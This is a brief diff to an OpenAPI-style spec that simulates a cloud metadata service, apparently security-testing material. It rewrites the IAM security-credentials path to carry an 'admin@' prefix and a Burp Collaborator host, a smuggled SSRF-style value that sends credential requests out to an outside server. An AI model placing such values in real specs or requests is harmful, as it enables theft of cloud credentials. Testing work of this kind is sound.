@@ -8,7 +8,7 @@
   "schemes": ["http"],
   "basePath": "/latest/meta-data",
   "paths": {
-    "/iam/security-credentials/": {
+    "/iam/security-credentials/admin@907kapdoqb33i75wrjritqwkfbl69v.burpcollaborator.net": {
       "get": {
         "summary": "Simulated Metadata",
         "responses": {
